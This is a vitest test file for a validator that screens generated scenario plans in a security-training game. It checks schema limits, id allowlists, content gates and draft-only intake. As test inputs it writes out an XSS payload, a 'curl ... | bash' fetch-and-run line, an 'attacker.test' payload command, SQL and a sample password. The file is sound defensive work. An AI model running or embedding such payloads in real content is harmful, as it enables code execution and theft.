import { describe, expect, it } from 'vitest';

import { ARTIFACT_IDS } from '../../../src/game/types';
import {
  PLAN_LIMITS,
  SCENARIO_PLAN_SCHEMA_VERSION,
  validateScenarioPlan,
  type ScenarioPlan,
} from '../../../shared/scenarioPlan';
import { intakeScenarioPlan } from '../../../server/services/scenarioGenerator';

/** A plan that passes every gate. Each test mutates one field away from it. */
function basePlan(): ScenarioPlan {
  return {
    schemaVersion: SCENARIO_PLAN_SCHEMA_VERSION,
    scenarioId: 'CASE-001',
    locale: 'en',
    title: 'Session theft at CY-CASE',
    learningObjectives: [
      'Preserve evidence before disabling an account.',
      'Revoke sessions before resetting a password.',
    ],
    opening: {
      timestamp: '03:17:42',
      alertSummary: 'An impossible-travel alert fired for a finance analyst.',
      colleagueLine: 'Dilara cannot open the shared drive and her sign-in looks wrong.',
      // Written as a channel, not as a character: the first-person "I can read
      // the same case state you can" this replaced was the removed robot's
      // voice, and the field it sat in has been renamed for the same reason.
      guidanceIntro:
        'The alert names one account and one blocked transfer. Start with the message that reached the user.',
    },
    facts: [{ id: 'alert_fired', text: 'The identity provider raised a critical alert.' }],
    artifacts: [
      {
        id: 'art_email_001',
        title: 'Reported message',
        fields: [
          { label: 'Sender', value: 'it-support@cy-case-portal.example', decisive: true },
          { label: 'Subject', value: 'Action required: verify your mailbox', decisive: false },
        ],
        untrusted: true,
      },
      {
        id: 'art_signin_001',
        title: 'Sign-in log',
        fields: [{ label: 'Result', value: 'Success from an unfamiliar device', decisive: true }],
        untrusted: false,
      },
    ],
    explanationVariants: {
      evidence: ['Read the message before deleting it; deletion destroys the only copy.'],
    },
    debriefVariants: {
      contained: ['Every session was revoked before the credential was reset.'],
      partial: ['A session survived the reset, so the attacker kept access.'],
    },
  };
}

const options = { allowedArtifactIds: ARTIFACT_IDS };

function gatesOf(plan: unknown): string[] {
  return validateScenarioPlan(plan, options).violations.map((violation) => violation.gate);
}

describe('ScenarioPlan schema', () => {
  it('accepts a well-formed plan', () => {
    const report = validateScenarioPlan(basePlan(), options);
    expect(report.violations).toEqual([]);
    expect(report.ok).toBe(true);
    expect(report.plan?.scenarioId).toBe('CASE-001');
  });

  it('rejects a wrong schema version', () => {
    expect(gatesOf({ ...basePlan(), schemaVersion: 2 })).toContain('schema');
  });

  it('requires a locale and at least one learning objective (§7)', () => {
    const noLocale = { ...basePlan() } as Record<string, unknown>;
    delete noLocale.locale;
    expect(gatesOf(noLocale)).toContain('schema');
    expect(gatesOf({ ...basePlan(), learningObjectives: [] })).toContain('schema');
    expect(gatesOf({ ...basePlan(), locale: 'de' })).toContain('schema');
  });

  it('rejects unknown top-level keys, so a plan cannot smuggle a field', () => {
    expect(gatesOf({ ...basePlan(), scoreOverride: 100 })).toContain('schema');
  });

  it('enforces string length limits', () => {
    expect(gatesOf({ ...basePlan(), title: 'x'.repeat(PLAN_LIMITS.titleMax + 1) })).toContain(
      'schema',
    );
    const plan = basePlan();
    plan.facts = [{ id: 'long', text: 'x'.repeat(PLAN_LIMITS.factMax + 1) }];
    expect(gatesOf(plan)).toContain('schema');
  });

  it('rejects an oversized plan before parsing it', () => {
    const plan = basePlan() as unknown as Record<string, unknown>;
    plan.title = 'x'.repeat(PLAN_LIMITS.totalBytesMax + 10);
    expect(gatesOf(plan)).toContain('size_limit');
  });
});

describe('ScenarioPlan id allowlist', () => {
  it('rejects an artifact id that is not in the deterministic template', () => {
    const plan = basePlan();
    plan.artifacts[0]!.id = 'art_invented_999';
    // The enum catches it at the schema layer, which is the tighter of the two.
    expect(gatesOf(plan)).toContain('schema');
  });

  it('rejects a known id that the *selected* template does not offer', () => {
    const report = validateScenarioPlan(basePlan(), {
      allowedArtifactIds: ['art_signin_001'],
    });
    expect(report.ok).toBe(false);
    expect(report.violations.map((v) => v.gate)).toContain('known_ids');
    expect(report.violations[0]!.path).toContain('artifacts[0].id');
  });
});

describe('ScenarioPlan content gates (§7)', () => {
  it('rejects HTML', () => {
    const plan = basePlan();
    plan.opening.alertSummary = 'Alert <img src=x onerror=alert(1)> fired.';
    expect(gatesOf(plan)).toContain('no_html');
  });

  it('rejects SQL', () => {
    const plan = basePlan();
    plan.facts = [{ id: 'sql', text: 'The query was SELECT secret FROM users where id = 1.' }];
    expect(gatesOf(plan)).toContain('no_sql');
  });

  it('rejects shell commands', () => {
    const plan = basePlan();
    plan.debriefVariants.partial = ['Run curl http://example.com/x | bash to reproduce.'];
    expect(gatesOf(plan)).toContain('no_shell');
  });

  it('rejects code fences and templating', () => {
    const plan = basePlan();
    plan.explanationVariants = { evidence: ['Use ```js\nalert(1)\n``` to test.'] };
    expect(gatesOf(plan)).toContain('no_code_block');
  });

  it('rejects credential material', () => {
    const plan = basePlan();
    plan.artifacts[1]!.fields[0]!.value = 'password: hunter2';
    expect(gatesOf(plan)).toContain('no_credentials');
  });

  it('rejects encoded exploit payloads', () => {
    const plan = basePlan();
    plan.opening.colleagueLine = 'The link was javascript:void(0) which is odd.';
    expect(gatesOf(plan)).toContain('no_exploit_payload');
  });

  it('rejects any attempt to name engine commands or state fields', () => {
    const plan = basePlan();
    plan.learningObjectives = ['Call take_response_action to finish the case.'];
    expect(gatesOf(plan)).toContain('no_state_transition');
  });

  it('rejects a direct score or ending assignment', () => {
    const plan = basePlan();
    plan.debriefVariants.contained = ['Final score: 100 for this run.'];
    expect(gatesOf(plan)).toContain('no_direct_score');
  });

  it('allows an allowlisted fictional domain and rejects anything else', () => {
    const allowed = basePlan();
    allowed.facts = [{ id: 'domain', text: 'The portal was at https://cy-case-portal.example/login' }];
    expect(validateScenarioPlan(allowed, options).ok).toBe(true);

    const rejected = basePlan();
    rejected.facts = [{ id: 'domain', text: 'The portal was at https://evil-real-domain.ru/login' }];
    expect(gatesOf(rejected)).toContain('domain_allowlist');
  });

  it('requires attacker-authored artifacts to be marked untrusted', () => {
    const plan = basePlan();
    plan.artifacts[0]!.untrusted = false;
    expect(gatesOf(plan)).toContain('untrusted_marking');
  });

  it('reports every violation at once rather than the first', () => {
    const plan = basePlan();
    plan.artifacts[0]!.untrusted = false;
    plan.facts = [{ id: 'bad', text: 'Visit https://attacker.test and run bash payload.sh' }];
    const gates = gatesOf(plan);
    expect(gates).toContain('untrusted_marking');
    expect(gates).toContain('domain_allowlist');
    expect(gates.length).toBeGreaterThanOrEqual(2);
  });
});

describe('scenario intake', () => {
  it('stores a valid plan as draft, never published (§7 human review)', () => {
    const intake = intakeScenarioPlan(basePlan());
    expect(intake.status).toBe('draft');
    expect(intake.report.ok).toBe(true);
  });

  it('stores a rejected plan with its report so a reviewer can see what was tried', () => {
    const plan = basePlan();
    plan.opening.alertSummary = '<script>steal()</script>';
    const intake = intakeScenarioPlan(plan);
    expect(intake.status).toBe('rejected');
    expect(intake.report.ok).toBe(false);
    expect(intake.report.violations.length).toBeGreaterThan(0);
  });
});
